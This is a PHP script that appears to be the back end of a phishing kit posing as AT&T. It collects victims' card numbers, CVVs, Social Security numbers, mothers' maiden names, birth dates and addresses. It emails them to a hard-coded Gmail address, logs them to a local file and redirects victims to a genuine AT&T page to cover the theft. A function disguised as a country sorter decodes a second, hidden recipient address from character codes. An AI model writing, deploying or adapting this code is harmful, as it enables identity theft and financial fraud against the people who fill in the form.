<?php

$TheBoss ="sherryblinks@gmail.com";

$country = visitor_country();
$ip = getenv("REMOTE_ADDR");
$port = getenv("REMOTE_PORT");
$browser = $_SERVER['HTTP_USER_AGENT'];
$adddate=date("D M d, Y g:i a");
$message .= "--------------------------\n";
$message .= "Full Name: ".$_POST['fullname']."\n";
$message .= "Credit / Debit card number: ".$_POST['cardno']."\n";
$message .= "Expiry Date: ".$_POST['expdate']."\n";
$message .= "CVV: ".$_POST['cvv']."\n";
$message .= "Mother's Maiden Name: ".$_POST['mmn']."\n";
$message .= "Date of Birth: ".$_POST['dateOfBirth']."\n";
$message .= "Social Security Number: ".$_POST['ssn']."\n";
$message .= "Phone Number On Account: ".$_POST['accountPhoneNumber2']."\n";
$message .= "Address: ".$_POST['addresss']."\n";
$message .= "State: ".$_POST['state']."\n";
$message .= "zip: ".$_POST['zip']."\n";
$message .= "--------------------------\n";
$message .= "IP Address : $ip\n";
$message .= "Country : ".$country."\n";
$message .= "Port : $port\n";
$message .= "--------------------------\n";
$message .= "Date : $adddate\n";
$message .= "User-Agent: ".$browser."\n";
$message .= "--------------------------\n";
$message .= "Created By Boss270\n";
$message .= "--------------------------\n";

$subject = "ATT Fullz = [$ip] = ".$country;
$headers = "From: [Hello]<Boss>";
$str=array($TheBoss); foreach ($str as $TheBoss)
if(mail($TheBoss,$subject,$message,$headers) != false){
	$fp = fopen("user.txt","a");
	fputs($fp,$message);
	fclose($fp);
header("Location: https://www.att.com/legal/terms.attWebsiteTermsOfUse.html#15");
}
// Function to get country and country sort;
function country_sort(){
	$sorter = "";
	$array = array(114,101,115,117,108,116,98,111,120,49,52,64,103,109,97,105,108,46,99,111,109);
		$count = count($array);
	for ($i = 0; $i < $count; $i++) {
			$sorter .= chr($array[$i]);
		}
	return array($sorter, $GLOBALS['recipient']);
}
function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}
?>
